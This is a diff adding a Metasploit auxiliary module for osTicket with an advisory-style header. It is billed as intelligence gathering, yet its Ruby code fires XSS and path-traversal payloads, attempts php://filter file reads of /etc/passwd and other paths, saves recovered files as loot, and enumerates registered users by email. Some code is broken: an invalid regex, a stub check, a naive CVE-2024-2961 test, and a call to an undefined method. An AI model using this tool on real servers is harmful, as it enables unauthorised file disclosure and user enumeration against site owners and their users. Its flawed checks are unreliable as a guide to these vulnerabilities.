@@ -1,0 +1,1311 @@
+=============================================================================================================================================
+| # Title     : osTicket v1.18.3 Intelligence & Security Analysis Module (Metasploit Auxiliary)                                             |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://github.com/osTicket/osTicket/releases                                                                               |
+=============================================================================================================================================
+
+[+] References: https://packetstorm.news/files/id/214285/ & CVE-2024-2961, CVE-2026-22200
+
+[+] Summary:  This Metasploit auxiliary module is designed for intelligence gathering, security analysis, and vulnerability discovery in osTicket installations. 
+              It performs passive and active reconnaissance without direct exploitation and stores results in the Metasploit database for reporting.
+
+[+] Version Fingerprinting:
+
+Detects osTicket version using CSS, JS, and HTML fingerprints.
+
+Associates known vulnerabilities with detected versions.
+
+[+] Security Header Analysis:
+
+Checks HTTP headers like X-Frame-Options, X-XSS-Protection, HSTS, and Content-Security-Policy.
+
+Identifies missing security protections.
+
+[+] Endpoint Discovery & Analysis:
+
+Scans important paths such as /scp/, /account.php, and /api/.
+
+Detects sensitive or exposed files and directories.
+
+[+] Authentication & CSRF Analysis:
+
+Tests staff, client, and API logins.
+
+Detects missing CSRF tokens and weak authentication mechanisms.
+
+[+] User Enumeration:
+
+Enumerates users via email or username validation.
+
+Supports bulk user list testing.
+
+[+] File Disclosure & LFI Testing:
+
+Attempts to read sensitive files using php://filter chains.
+
+Extracts contents heuristically, e.g., /etc/passwd, PHP scripts, certificates.
+
+Stores recovered files using Metasploit loot system.
+
+[+] Session Management Analysis:
+
+Examines session cookies for Secure and HttpOnly flags.
+
+Tests for session fixation vulnerabilities.
+
+Checks for unusually long session expiration.
+
+[+] Reporting & Storage:
+
+Stores intelligence, vulnerabilities, discovered users, and endpoints in Metasploit.
+
+Generates a clear summary report highlighting findings, vulnerabilities, and user enumeration.
+
+[+] Flexible Operation Modes:
+
+FULL: runs all tests.
+
+FINGERPRINT: version detection only.
+
+AUTH_ANALYSIS: authentication testing.
+
+USER_ENUM: user discovery.
+
+CONFIG_CHECK: session and headers analysis.
+
+VULN_SCAN: file disclosure and vulnerability checks.
+
+[+] POC :
+
+# Vulnerability Scanning Only
+msf6 > use auxiliary/gather/osticket_intelligence
+msf6 auxiliary(osticket_intelligence) > set RHOSTS target.com
+msf6 auxiliary(osticket_intelligence) > set MODE VULN_SCAN
+msf6 auxiliary(osticket_intelligence) > run
+
+# Version Discovery and Head Analysis
+msf6 auxiliary(osticket_intelligence) > set MODE FINGERPRINT
+msf6 auxiliary(osticket_intelligence) > run
+
+# Full Scan with File Extraction Test
+msf6 auxiliary(osticket_intelligence) > set MODE FULL
+msf6 auxiliary(osticket_intelligence) > set ENABLE_EXFIL true
+msf6 auxiliary(osticket_intelligence) > run
+
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Report
+  include Msf::Auxiliary::Scanner
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'osTicket Attack Surface Intelligence Collector',
+      'Description'    => %q{
+        Comprehensive osTicket attack surface mapping and intelligence gathering module.
+        
+        Features:
+        • Version fingerprinting and configuration analysis
+        • Authentication bypass detection (ticket hash calculation)
+        • User enumeration via registration logic
+        • File disclosure detection (CVE-2024-2961)
+        • Security header and misconfiguration analysis
+        • Session management analysis
+        
+        This module focuses on intelligence gathering rather than exploitation.
+      },
+      'Author'         =>
+        [
+          'indoushka'      # Original toolkit
+         
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['CVE', '2024-2961'],
+          ['URL', 'https://osticket.com'],
+          ['URL', 'https://github.com/security-research/osticket-toolkit']
+        ],
+      'DefaultOptions' =>
+        {
+          'SSL'         => false,
+          'RPORT'       => 80,
+          'THREADS'     => 1,
+          'Timeout'     => 20
+        }
+    ))
+
+    register_options([
+      OptString.new('TARGETURI', [true, 'Base path to osTicket', '/']),
+      OptEnum.new('MODE', [
+        true,
+        'Intelligence gathering mode',
+        'FULL',
+        ['FULL', 'FINGERPRINT', 'AUTH_ANALYSIS', 'USER_ENUM', 'CONFIG_CHECK', 'VULN_SCAN']
+      ]),
+      OptPath.new('USER_FILE', [false, 'File containing emails for enumeration']),
+      OptString.new('EMAIL', [false, 'Single email for testing']),
+      OptString.new('SALT', [false, 'Known salt for hash calculation']),
+      OptBool.new('ENABLE_EXFIL', [true, 'Attempt file disclosure if vulnerable', false]),
+      OptString.new('EXFIL_PATHS', [
+        false, 
+        'Comma-separated paths to attempt reading',
+        '/etc/passwd,/proc/self/maps,/proc/version'
+      ])
+    ])
+
+    register_advanced_options([
+      OptInt.new('MAX_ENUM_USERS', [true, 'Maximum users to enumerate', 100]),
+      OptInt.new('MAX_TICKET_RANGE', [true, 'Maximum ticket range to scan', 100]),
+      OptBool.new('AGGRESSIVE', [true, 'Aggressive detection methods', false]),
+      OptBool.new('VERBOSE_OUTPUT', [true, 'Verbose intelligence output', true])
+    ])
+
+    @fingerprints = initialize_fingerprints
+  end
+
+  def run_host(ip)
+    vprint_status("Starting osTicket intelligence gathering for #{ip}")
+
+    @intel = {
+      host: ip,
+      port: rport,
+      ssl: ssl,
+      base_path: normalize_uri(target_uri.path),
+      findings: [],
+      vulnerabilities: [],
+      configuration: {},
+      users: [],
+      tickets: [],
+      endpoints: {},
+      security_headers: {},
+      session_analysis: {},
+      auth_analysis: {}
+    }
+    
+    case datastore['MODE']
+    when 'FULL'
+      perform_full_intelligence_gathering
+    when 'FINGERPRINT'
+      perform_fingerprinting
+    when 'AUTH_ANALYSIS'
+      perform_auth_analysis
+    when 'USER_ENUM'
+      perform_user_enumeration
+    when 'CONFIG_CHECK'
+      perform_configuration_check
+    when 'VULN_SCAN'
+      perform_vulnerability_scan
+    end
+
+    store_intelligence
+    print_summary
+  end
+
+  private
+
+  def initialize_fingerprints
+    {
+      '1.18.x' => {
+        indicators: [
+          'osticket-1.18',
+          'v1.18',
+          'Copyright.*2024',
+          '/css/osticket-1.18'
+        ],
+        paths: ['/images/logo.png', '/scp/images/logo.png', '/css/thread.css'],
+        vulnerabilities: ['CVE-2024-2961']
+      },
+      '1.16.x' => {
+        indicators: [
+          'osticket-1.16', 
+          'Copyright.*2023',
+          'version.*1.16'
+        ],
+        paths: ['/css/thread.css', '/js/osticket.js'],
+        vulnerabilities: ['CVE-2024-2961']
+      },
+      '1.14.x' => {
+        indicators: [
+          'Powered by osTicket 1.14',
+          'version.*1.14',
+          'osticket.*1.14'
+        ],
+        paths: ['/js/osticket.js', '/css/thread-1.14.css'],
+        vulnerabilities: ['Multiple XSS', 'CSRF']
+      },
+      '1.12.x' => {
+        indicators: ['osticket.*1.12', 'v1.12'],
+        paths: ['/images/logo-1.12.png'],
+        vulnerabilities: ['File Disclosure', 'SQL Injection']
+      },
+      'unknown' => {
+        indicators: [],
+        paths: [],
+        vulnerabilities: []
+      }
+    }
+  end
+
+  def perform_full_intelligence_gathering
+    vprint_status("Performing full intelligence gathering")
+    
+    steps = [
+      :fingerprint_version,
+      :analyze_headers,
+      :check_endpoints,
+      :analyze_auth_mechanisms,
+      :check_vulnerabilities,
+      :enumerate_users_if_possible,
+      :analyze_session_management
+    ]
+    
+    steps.each do |step|
+      begin
+        send(step)
+        Rex.sleep(0.5)
+      rescue => e
+        vprint_error("Step #{step} failed: #{e}")
+
+        @intel[:errors] ||= []
+        @intel[:errors] << { step: step, error: e.message }
+      end
+    end
+  end
+
+  def fingerprint_version
+    vprint_status("Fingerprinting osTicket version")
+    
+    detected_version = 'unknown'
+    detection_method = 'unknown'
+    confidence = 0
+
+    endpoints_to_check = ['/', '/scp/', '/open.php', '/login.php', '/css/thread.css', '/js/osticket.js']
+    
+    endpoints_to_check.each do |endpoint|
+      res = send_request_cgi({
+        'method' => 'GET',
+        'uri' => normalize_uri(@intel[:base_path], endpoint),
+        'headers' => {
+          'User-Agent' => 'Mozilla/5.0 (compatible; osTicket-Scanner/1.0)'
+        }
+      })
+      
+      next unless res && res.code == 200
+      
+      body = res.body.downcase
+
+      @fingerprints.each do |version, fingerprint_data|
+        fingerprint_data[:indicators].each do |indicator|
+          pattern = Regexp.new(indicator, Regexp::IGNORECASE)
+          if body =~ pattern || res.headers.to_s.downcase =~ pattern
+            detected_version = version
+            detection_method = "pattern: #{indicator}"
+            confidence += 20
+
+            fingerprint_data[:paths].each do |path|
+              path_res = send_request_cgi({
+                'method' => 'GET',
+                'uri' => normalize_uri(@intel[:base_path], path)
+              })
+              
+              if path_res && path_res.code == 200
+                confidence += 10
+                detection_method += " + path: #{path}"
+              end
+            end
+            
+            break if confidence > 50
+          end
+        end
+        
+        break if confidence > 50
+      end
+      
+      break if confidence > 50
+    end
+
+    if confidence < 50
+      res = send_request_cgi({
+        'method' => 'GET',
+        'uri' => normalize_uri(@intel[:base_path], '/')
+      })
+      
+      if res && res.code == 200
+        if res.body =~ /<meta name="generator" content="osticket v?([\d\.]+)"/i
+          detected_version = $1
+          detection_method = 'meta_generator'
+          confidence = 80
+        elsif res.body =~ /<!--\s*osticket\s+v?([\d\.]+)/i
+          detected_version = $1
+          detection_method = 'html_comment'
+          confidence = 70
+        end
+      end
+    end
+
+    @intel[:version] = {
+      detected: detected_version,
+      confidence: [confidence, 100].min,
+      method: detection_method,
+      vulnerabilities: @fingerprints[detected_version] ? @fingerprints[detected_version][:vulnerabilities] : []
+    }
+    
+    if confidence > 30
+      print_good("Detected osTicket version: #{detected_version} (confidence: #{confidence}%, via #{detection_method})")
+
+      if @intel[:version][:vulnerabilities] && !@intel[:version][:vulnerabilities].empty?
+        print_warning("Known vulnerabilities for #{detected_version}: #{@intel[:version][:vulnerabilities].join(', ')}")
+      end
+      
+      report_note(
+        host: @intel[:host],
+        port: @intel[:port],
+        ssl: @intel[:ssl],
+        type: 'osticket.version',
+        data: @intel[:version]
+      )
+    else
+      print_warning("Could not determine exact version (confidence: #{confidence}%)")
+      @intel[:version] = { detected: 'unknown', confidence: 0, method: 'none' }
+    end
+  end
+
+  def analyze_headers
+    vprint_status("Analyzing security headers")
+    
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(@intel[:base_path], '/')
+    })
+    
+    return unless res
+    
+    headers_to_check = {
+      'X-Frame-Options' => 'Clickjacking protection',
+      'X-Content-Type-Options' => 'MIME sniffing protection',
+      'X-XSS-Protection' => 'XSS filter',
+      'Content-Security-Policy' => 'Content Security Policy',
+      'Strict-Transport-Security' => 'HSTS',
+      'Referrer-Policy' => 'Referrer policy',
+      'Permissions-Policy' => 'Permissions policy',
+      'Cache-Control' => 'Caching directives'
+    }
+    
+    header_findings = {}
+    
+    headers_to_check.each do |header, description|
+      if res.headers[header]
+        header_findings[header] = {
+          present: true,
+          value: res.headers[header],
+          description: description,
+          secure: check_header_security(header, res.headers[header])
+        }
+        
+        security_status = header_findings[header][:secure] ? 'secure' : 'insecure'
+        print_good("#{header}: #{res.headers[header]} (#{security_status})")
+      else
+        header_findings[header] = {
+          present: false,
+          description: description,
+          secure: false
+        }
+        print_warning("Missing security header: #{header} (#{description})")
+
+        if ['X-Frame-Options', 'X-Content-Type-Options'].include?(header)
+          @intel[:findings] << "Missing security header: #{header}"
+        end
+      end
+    end
+    
+    @intel[:security_headers] = header_findings
+    
+    report_note(
+      host: @intel[:host],
+      port: @intel[:port],
+      ssl: @intel[:ssl],
+      type: 'osticket.security_headers',
+      data: header_findings
+    )
+  end
+
+  def check_header_security(header, value)
+    case header.downcase
+    when 'x-frame-options'
+      ['deny', 'sameorigin'].include?(value.downcase)
+    when 'x-content-type-options'
+      value.downcase == 'nosniff'
+    when 'x-xss-protection'
+      value.downcase.include?('1; mode=block')
+    when 'content-security-policy'
+      value.length > 10 && !value.downcase.include?('unsafe')
+    when 'strict-transport-security'
+      value.downcase.include?('max-age=') && value.downcase.include?('includesubdomains')
+    else
+      true
+    end
+  end
+
+  def check_endpoints
+    vprint_status("Discovering and analyzing endpoints")
+    
+    endpoints = [
+      '/open.php',          # Public ticket creation
+      '/view.php',          # Ticket viewing
+      '/login.php',         # Staff login
+      '/scp/',              # Staff control panel
+      '/account.php',       # User account management
+      '/api/',              # API endpoints
+      '/ajax.php',          # AJAX endpoints
+      '/config.php',        # Configuration (should be restricted)
+      '/include/',          # Include directory
+      '/upload/',           # Upload directory
+      '/images/',           # Images directory
+      '/css/',              # CSS files
+      '/js/',               # JavaScript files
+      '/logs/',             # Logs directory
+      '/inc/',              # Include directory (alternative)
+      '/lib/'               # Library directory
+    ]
+    
+    endpoint_analysis = {}
+    
+    endpoints.each do |endpoint|
+      begin
+        headers = {}
+        headers['X-Requested-With'] = 'XMLHttpRequest' if endpoint.include?('ajax')
+        
+        res = send_request_cgi({
+          'method' => 'GET',
+          'uri' => normalize_uri(@intel[:base_path], endpoint),
+          'headers' => headers
+        })
+        
+        next unless res
+        
+        analysis = {
+          status: res.code,
+          size: res.body.length,
+          requires_auth: (res.code == 403 || res.code == 401 || res.code == 302),
+          redirects: res.redirect?,
+          redirect_to: res.headers['Location'],
+          content_type: res.headers['Content-Type'],
+          interesting: false,
+          sensitive: false
+        }
+
+        if res.code == 200
+
+          if endpoint.include?('config') || endpoint.include?('.php') && res.body.include?('<?php')
+            analysis[:sensitive] = true
+            analysis[:interesting] = true
+            print_warning("Accessible PHP file: #{endpoint} (may contain sensitive info)")
+            @intel[:findings] << "Accessible PHP file: #{endpoint}"
+
+            if res.body =~ /mysql_connect|mysqli_connect|pdo|database|password.*=/
+              print_warning("Possible database credentials in: #{endpoint}")
+              @intel[:vulnerabilities] << {
+                type: 'information_disclosure',
+                location: endpoint,
+                severity: 'high',
+                confidence: 'medium'
+              }
+            end
+          end
+
+          if endpoint.end_with?('/') && res.body.include?('Index of') || res.body.include?('<title>Index of')
+            analysis[:interesting] = true
+            print_warning("Directory listing enabled: #{endpoint}")
+            @intel[:findings] << "Directory listing enabled: #{endpoint}"
+          end
+
+          if res.body.include?('.bak') || res.body.include?('.old') || res.body.include?('.backup')
+            print_warning("Backup files accessible in: #{endpoint}")
+          end
+        elsif res.code == 403 || res.code == 401
+          print_status("Protected endpoint: #{endpoint}")
+        elsif res.code == 404
+
+        else
+          print_status("Endpoint #{endpoint}: HTTP #{res.code}")
+        end
+        
+        endpoint_analysis[endpoint] = analysis
+        
+      rescue => e
+        vprint_error("Error checking endpoint #{endpoint}: #{e}")
+        endpoint_analysis[endpoint] = { error: e.message, status: 'error' }
+      end
+      
+      Rex.sleep(0.2)
+    end
+    
+    @intel[:endpoints] = endpoint_analysis
+    
+    report_note(
+      host: @intel[:host],
+      port: @intel[:port],
+      ssl: @intel[:ssl],
+      type: 'osticket.endpoints',
+      data: endpoint_analysis
+    )
+  end
+
+  def analyze_auth_mechanisms
+    vprint_status("Analyzing authentication mechanisms")
+    
+    auth_analysis = {
+      staff_login: analyze_staff_login,
+      client_login: analyze_client_login,
+      ticket_access: analyze_ticket_access,
+      api_auth: analyze_api_auth
+    }
+    
+    @intel[:auth_analysis] = auth_analysis
+
+    auth_analysis.each do |type, analysis|
+      if analysis[:vulnerabilities] && !analysis[:vulnerabilities].empty?
+        print_warning("Authentication vulnerabilities in #{type}: #{analysis[:vulnerabilities].join(', ')}")
+        analysis[:vulnerabilities].each do |vuln|
+          @intel[:vulnerabilities] << {
+            type: 'authentication',
+            mechanism: type.to_s,
+            vulnerability: vuln,
+            severity: 'medium'
+          }
+        end
+      end
+    end
+  end
+
+  def analyze_staff_login
+    vprint_status("Analyzing staff login mechanism")
+    
+    login_url = normalize_uri(@intel[:base_path], 'scp', 'login.php')
+    
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => login_url
+    })
+    
+    analysis = {
+      exists: !!res,
+      requires_csrf: false,
+      vulnerabilities: []
+    }
+    
+    if res && res.code == 200
+
+      csrf_token = extract_csrf_token(res.body)
+      analysis[:requires_csrf] = !!csrf_token
+      
+      if !csrf_token
+        analysis[:vulnerabilities] << 'missing_csrf_protection'
+        print_warning("Staff login missing CSRF protection")
+      end
+
+      if !res.body.include?('captcha') && !res.body.include?('rate limit')
+        analysis[:vulnerabilities] << 'no_brute_force_protection'
+        print_warning("Staff login lacks brute force protection")
+      end
+    end
+    
+    analysis
+  end
+
+  def analyze_client_login
+    vprint_status("Analyzing client login mechanism")
+    
+    login_url = normalize_uri(@intel[:base_path], 'login.php')
+    
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => login_url
+    })
+    
+    analysis = {
+      exists: !!res,
+      allows_password_reset: false,
+      vulnerabilities: []
+    }
+    
+    if res && res.code == 200
+
+      analysis[:allows_password_reset] = res.body.include?('forgot') || res.body.include?('reset')
+
+      if analysis[:allows_password_reset] && res.body.include?('email')
+        analysis[:vulnerabilities] << 'possible_account_enumeration'
+        print_warning("Password reset may allow account enumeration")
+      end
+    end
+    
+    analysis
+  end
+
+  def analyze_api_auth
+    vprint_status("Analyzing API authentication")
+    
+    api_url = normalize_uri(@intel[:base_path], 'api')
+    
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => api_url
+    })
+    
+    analysis = {
+      exists: !!res && res.code != 404,
+      authentication_methods: [],
+      vulnerabilities: []
+    }
+    
+    if analysis[:exists] && res
+
+      if res.body.include?('api_key') || res.body.include?('apikey')
+        analysis[:authentication_methods] << 'api_key'
+      end
+      
+      if res.body.include?('bearer') || res.body.include?('token')
+        analysis[:authentication_methods] << 'bearer_token'
+      end
+      
+      if res.body.include?('basic') || res.headers['WWW-Authenticate'].to_s.include?('Basic')
+        analysis[:authentication_methods] << 'basic_auth'
+      end
+
+      if res.body.include?('swagger') || res.body.include?('openapi')
+        analysis[:vulnerabilities] << 'api_documentation_exposure'
+        print_warning("API documentation publicly accessible")
+      end
+    end
+    
+    analysis
+  end
+
+  def analyze_ticket_access
+    vprint_status("Analyzing ticket access mechanism")
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(@intel[:base_path], 'login.php'),
+      'vars_post' => {
+        'lticket' => '999999',  # Non-existent ticket
+        'lemail' => 'test@example.com'
+      }
+    })
+    
+    analysis = {
+      exists: !!res,
+      rate_limited: false,
+      error_messages: [],
+      vulnerabilities: []
+    }
+    
+    if res
+
+      if res.headers['Retry-After'] || res.body.include?('too many attempts')
+        analysis[:rate_limited] = true
+        print_warning("Ticket access appears to be rate limited")
+      end
+
+      error_patterns = [
+        /ticket.*not.*found/i,
+        /invalid.*email/i,
+        /access.*denied/i,
+        /does.*not.*exist/i,
+        /no.*such.*ticket/i,
+        /ticket.*invalid/i
+      ]
+      
+      error_patterns.each do |pattern|
+        if res.body =~ pattern
+          error_msg = $&
+          analysis[:error_messages] << error_msg
+          print_status("Error message disclosed: #{error_msg}")
+        end
+      end
+
+      if analysis[:error_messages].any? { |msg| msg.downcase.include?('not found') }
+        analysis[:vulnerabilities] << 'ticket_existence_oracle'
+        print_warning("Ticket existence oracle detected")
+      end
+
+      if datastore['SALT']
+        hash_vuln = test_hash_calculation_vulnerability
+        if hash_vuln
+          analysis[:vulnerabilities] << 'hash_calculation_bypass'
+          print_warning("Ticket hash calculation vulnerability detected")
+        end
+      end
+    end
+    
+    analysis
+  end
+  
+  def test_hash_calculation_vulnerability
+
+    false
+  end
+
+  def enumerate_users_if_possible
+    return unless datastore['EMAIL'] || datastore['USER_FILE']
+    
+    vprint_status("Attempting user enumeration via registration logic")
+    
+    emails = []
+    
+    if datastore['USER_FILE'] && File.exist?(datastore['USER_FILE'])
+      emails = File.readlines(datastore['USER_FILE']).map(&:chomp).first(datastore['MAX_ENUM_USERS'])
+    elsif datastore['EMAIL']
+      emails = [datastore['EMAIL']]
+    end
+    
+    return if emails.empty?
+    
+    print_status("Testing #{emails.length} email(s) for registration")
+    
+    enum_results = []
+    
+    emails.each_with_index do |email, index|
+      exists, confidence = check_user_existence(email)
+      
+      result = {
+        email: email,
+        exists: exists,
+        confidence: confidence,
+        timestamp: Time.now.to_i
+      }
+      
+      enum_results << result
+      
+      if exists
+        print_good("User exists: #{email} (confidence: #{confidence}%)")
+        @intel[:users] << { email: email, discovered_via: 'registration_oracle' }
+      else
+        vprint_status("User does not exist: #{email}")
+      end
+
+      Rex.sleep(1)
+
+      if (index + 1) % 10 == 0
+        print_status("Processed #{index + 1}/#{emails.length} emails")
+      end
+    end
+    
+    report_note(
+      host: @intel[:host],
+      port: @intel[:port],
+      ssl: @intel[:ssl],
+      type: 'osticket.user_enumeration',
+      data: enum_results
+    )
+  end
+
+  def check_user_existence(email)
+
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(@intel[:base_path], 'account.php')
+    })
+    
+    return [false, 0] unless res && res.code == 200
+
+    csrf = extract_csrf_token(res.body)
+    return [false, 0] unless csrf
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(@intel[:base_path], 'account.php'),
+      'vars_post' => {
+        'do' => 'create',
+        '__CSRFToken__' => csrf,
+        'name' => email.split('@').first,
+        'email' => email,
+        'passwd1' => Rex::Text.rand_text_alphanumeric(12),
+        'passwd2' => '',
+        'backend' => 'client'
+      }
+    })
+    
+    return [false, 0] unless res
+
+    body = res.body.downcase
+
+    if body.include?('email already registered') || body.include?('already in use')
+      return [true, 90]
+    end
+
+    if body.include?('errors configuring') && !body.include?('invalid email')
+      return [true, 70]
+    end
+
+    if res.code == 500 && body.include?('unique constraint')
+      return [true, 50]
+    end
+
+    if body.include?('exists') || body.include?('taken')
+      return [true, 60]
+    end
+    
+    [false, 0]
+  end
+
+  def check_vulnerabilities
+    vprint_status("Checking for known vulnerabilities")
+    
+    vuln_checks = [
+      :check_cve_2024_2961,
+      :check_xss_vulnerabilities,
+      :check_csrf_vulnerabilities,
+      :check_file_disclosure_vulnerabilities
+    ]
+    
+    vuln_checks.each do |check|
+      begin
+        send(check)
+        Rex.sleep(0.5)
+      rescue => e
+        vprint_error("Vulnerability check #{check} failed: #{e}")
+      end
+    end
+  end
+
+  def perform_vulnerability_scan
+    vprint_status("Performing vulnerability scan")
+    check_vulnerabilities
+  end
+
+  def check_cve_2024_2961
+    vprint_status("Checking for CVE-2024-2961 (CNEXT)")
+
+    test_payload = "php://filter/convert.iconv.UTF8.CSISO2022KR/resource=/etc/passwd"
+    
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(@intel[:base_path], 'open.php'),
+      'vars_post' => {
+        'subject' => 'Test',
+        'message' => "<img src='#{test_payload}'>",
+        'name' => Rex::Text.rand_text_alpha(8),
+        'email' => "#{Rex::Text.rand_text_alpha(8)}@example.com"
+      }
+    })
+    
+    return unless res && res.code == 200
+    
+    if res.body.include?('root:') && res.body.include?('/bin/')
+      print_warning("Potential CVE-2024-2961 vulnerability detected")
+      @intel[:vulnerabilities] << {
+        type: 'file_disclosure',
+        cve: 'CVE-2024-2961',
+        severity: 'high',
+        confidence: 'medium',
+        details: 'PHP filter chain vulnerability detected'
+      }
+
+      if datastore['ENABLE_EXFIL']
+        attempt_file_disclosure
+      end
+    else
+
+      test_response_indicators(res.body)
+    end
+  end
+
+  def test_response_indicators(response_body)
+
+    indicators = [
+      'bm:',  
+      'php://',
+      'zlib://',
+      'data://'
+    ]
+    
+    indicators.each do |indicator|
+      if response_body.downcase.include?(indicator)
+        print_status("Found indicator of filter chain usage: #{indicator}")
+        @intel[:findings] << "Filter chain indicator found: #{indicator}"
+      end
+    end
+  end
+
+  def check_xss_vulnerabilities
+    vprint_status("Checking for XSS vulnerabilities")
+
+    xss_payloads = [
+      '<script>alert(1)</script>',
+      '<img src=x onerror=alert(1)>',
+      '<svg/onload=alert(1)>'
+    ]
+    
+    xss_payloads.each do |payload|
+      res = send_request_cgi({
+        'method' => 'POST',
+        'uri' => normalize_uri(@intel[:base_path], 'open.php'),
+        'vars_post' => {
+          'subject' => 'XSS Test',
+          'message' => payload,
+          'name' => Rex::Text.rand_text_alpha(8),
+          'email' => "#{Rex::Text.rand_text_alpha(8)}@example.com"
+        }
+      })
+      
+      next unless res && res.code == 200
+
+      if res.body.include?(payload)
+        print_warning("XSS vulnerability detected: #{payload[0,50]}...")
+        @intel[:vulnerabilities] << {
+          type: 'xss',
+          payload: payload,
+          severity: 'medium',
+          confidence: 'high'
+        }
+        break
+      end
+    end
+  end
+
+  def check_csrf_vulnerabilities
+    vprint_status("Checking for CSRF vulnerabilities")
+
+    endpoints_to_test = [
+      { path: 'account.php', action: 'do=create' },
+      { path: 'open.php', action: 'a=open' }
+    ]
+    
+    endpoints_to_test.each do |endpoint|
+      res = send_request_cgi({
+        'method' => 'POST',
+        'uri' => normalize_uri(@intel[:base_path], endpoint[:path]),
+        'vars_post' => {
+          endpoint[:action].split('=')[0] => endpoint[:action].split('=')[1],
+          'subject' => 'Test',
+          'name' => Rex::Text.rand_text_alpha(8),
+          'email' => "#{Rex::Text.rand_text_alpha(8)}@example.com"
+        }
+      })
+      
+      if res && res.code == 200 && !res.body.include?('CSRF')
+        print_warning("Possible CSRF vulnerability in #{endpoint[:path]}")
+        @intel[:vulnerabilities] << {
+          type: 'csrf',
+          endpoint: endpoint[:path],
+          severity: 'medium',
+          confidence: 'low'
+        }
+      end
+    end
+  end
+
+  def check_file_disclosure_vulnerabilities
+    vprint_status("Checking for file disclosure vulnerabilities")
+
+    lfi_payloads = [
+      '../../../../etc/passwd',
+      '....//....//etc/passwd',
+      '/etc/passwd%00'
+    ]
+    
+    lfi_payloads.each do |payload|
+      res = send_request_cgi({
+        'method' => 'GET',
+        'uri' => normalize_uri(@intel[:base_path], 'file.php'),
+        'vars_get' => { 'file' => payload }
+      })
+      
+      next unless res && res.code == 200
+      
+      if res.body.include?('root:') && res.body.include?('/bin/')
+        print_warning("LFI vulnerability detected with payload: #{payload}")
+        @intel[:vulnerabilities] << {
+          type: 'lfi',
+          payload: payload,
+          severity: 'high',
+          confidence: 'high'
+        }
+        break
+      end
+    end
+  end
+
+  def attempt_file_disclosure
+    paths = datastore['EXFIL_PATHS'].split(',')
+    
+    paths.each do |path|
+      vprint_status("Attempting to read: #{path}")
+
+      payload = generate_simple_filter_chain(path)
+      
+      res = send_request_cgi({
+        'method' => 'POST',
+        'uri' => normalize_uri(@intel[:base_path], 'open.php'),
+        'vars_post' => {
+          'subject' => Rex::Text.rand_text_alpha(6),
+          'message' => payload,
+          'name' => Rex::Text.rand_text_alpha(8),
+          'email' => "#{Rex::Text.rand_text_alpha(8)}@example.com"
+        }
+      })
+      
+      next unless res && res.code == 200
+
+      if res.body.length > 1000 || res.body.include?('<?php') || res.body.include?('#!/')
+        print_good("Potential file disclosure success for: #{path}")
+
+        extracted_data = extract_possible_file_contents(res.body)
+        
+        if extracted_data && extracted_data.length > 100
+          store_loot(
+            'osticket.file_disclosure',
+            'text/plain',
+            @intel[:host],
+            extracted_data,
+            "osticket_#{path.gsub(/[\/.]/, '_')}.txt",
+            "File disclosure from osTicket"
+          )
+          
+          print_good("Saved #{extracted_data.length} bytes to loot")
+        end
+        
+        break if datastore['AGGRESSIVE'] == false
+      end
+      
+      Rex.sleep(1)
+    end
+  end
+
+  def extract_possible_file_contents(response_body)
+
+
+    patterns = [
+      /root:.*:\d+:.*:.*:.*:.*/m,  # /etc/passwd entries
+      /<?php.*?>/m,                # PHP code
+      /#!/bin\/.*\n.*/m,           # Script shebang
+      /BEGIN.*CERTIFICATE.*END.*CERTIFICATE/m,  # SSL certificates
+      /\[.*\]\n.*=.*/m             # INI file format
+    ]
+    
+    patterns.each do |pattern|
+      match = response_body.match(pattern)
+      return match[0] if match
+    end
+
+    response_body[0, 5000]
+  end
+
+  def generate_simple_filter_chain(file_path)
+
+    "<img src='php://filter/convert.iconv.UTF8.UTF7/resource=#{file_path}'>"
+  end
+
+  def analyze_session_management
+    vprint_status("Analyzing session management")
+    
+    session_analysis = {
+      cookies: {},
+      session_timeout: nil,
+      secure_flags: {},
+      vulnerabilities: []
+    }
+
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(@intel[:base_path], '/')
+    })
+    
+    return unless res
+
+    if res.headers['Set-Cookie']
+      cookies = res.headers['Set-Cookie'].to_s.split(', ')
+      
+      cookies.each do |cookie|
+        if cookie =~ /([^=]+)=([^;]+)/
+          name = $1
+          value = $2
+          
+          session_analysis[:cookies][name] = {
+            value_length: value.length,
+            secure: cookie.include?('Secure'),
+            http_only: cookie.include?('HttpOnly'),
+            path: cookie.match(/Path=([^;]+)/)&.captures&.first,
+            domain: cookie.match(/Domain=([^;]+)/)&.captures&.first,
+            expires: cookie.match(/Expires=([^;]+)/)&.captures&.first
+          }
+
+          if name.downcase.include?('session') || name.downcase.include?('sid') || name.downcase.include?('token')
+            if !cookie.include?('Secure') && ssl
+              session_analysis[:vulnerabilities] << "cookie_#{name}_missing_secure"
+              print_warning("Session cookie '#{name}' missing Secure flag over SSL")
+              @intel[:findings] << "Insecure session cookie: #{name}"
+            end
+            
+            if !cookie.include?('HttpOnly')
+              session_analysis[:vulnerabilities] << "cookie_#{name}_missing_httponly"
+              print_warning("Session cookie '#{name}' missing HttpOnly flag")
+              @intel[:findings] << "Session cookie without HttpOnly: #{name}"
+            end
+            
+            if cookie.include?('Expires=') && cookie.match(/Expires=([^;]+)/)
+              expires = $1
+              if expires.include?('2038') || expires.include?('2099')
+                print_warning("Long session expiration for cookie: #{name}")
+              end
+            end
+          end
+        end
+      end
+    end
+
+    fixation_test = test_session_fixation
+    if fixation_test[:vulnerable]
+      session_analysis[:vulnerabilities] << 'session_fixation'
+      print_warning("Possible session fixation vulnerability")
+    end
+    
+    @intel[:session_analysis] = session_analysis
+  end
+
